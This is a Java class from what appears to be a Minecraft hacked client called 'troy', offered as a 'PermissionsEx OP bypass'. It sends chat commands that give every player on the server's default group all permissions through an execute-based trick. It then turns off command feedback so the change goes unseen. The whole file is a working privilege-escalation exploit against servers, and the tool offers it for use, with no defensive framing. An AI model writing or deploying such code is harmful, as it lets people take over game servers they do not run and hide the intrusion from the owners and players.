package com.md_4.troy.command.bypass.pex;


import com.md_4.troy.command.bypass.BypassInfo;
import com.md_4.troy.command.bypass.BypassType;
import com.md_4.troy.exception.BypassException;
import com.md_4.troy.exploit.Bypass;
import com.md_4.troy.helper.ChatHelper;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;

@BypassInfo(
        name = "pex",
        type = BypassType.PEX,
        description = "PermissionsEx OP bypass"
)
public class PermissionExBypass extends Bypass {

    @Override
    public void execute(Object... args) throws BypassException {
        long start = System.currentTimeMillis();
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/minecraft:execute @e ~ ~ ~ pex group default add permissions.*"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/gamerule sendCommandfeedback false"));
        Minecraft.getMinecraft().getNetHandler().addToSendQueue(new C01PacketChatMessage("/minecraft:gamerule sendCommandfeedback false"));
        ChatHelper.printMessage(String.format("&b • &bSent &8[&7Method: &3%s&7, Time: &3%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
